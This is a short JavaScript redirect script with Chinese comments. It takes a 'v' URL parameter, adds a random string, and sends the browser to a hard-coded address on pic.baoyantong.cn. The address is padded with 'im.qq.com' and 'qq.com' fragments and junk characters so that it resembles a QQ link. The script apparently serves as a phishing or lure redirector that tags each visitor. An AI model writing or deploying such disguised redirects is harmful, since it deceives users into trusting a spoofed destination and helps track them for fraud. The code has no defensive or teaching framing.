// remote_script.js

// 获取 URL 参数
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const customParam = urlParams.get('v');

// 生成随机数字和英文组合 Fr0iy7UeDNxlynjswdEHIcalaTkv
const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母

// 构建跳转链接
let redirectURL = "https://pic.baoyantong.cn/pic/202105012141/https://im.qq.com/https://qq.com/osssssxzwswfzlaFg,SwMMlQ*,*,;4ks3c,/5sx3.xml";
// https://static.ylxweb.com/upload/xinyue/2024/FlOoFt0jr9OpaT9jitYy8YNZHsuA.html
if (customParam) {
    redirectURL += "?u=" + customParam + "&" + randomString; // 将随机字符串添加到参数后面
    // 执行跳转
window.location.href = redirectURL;
}


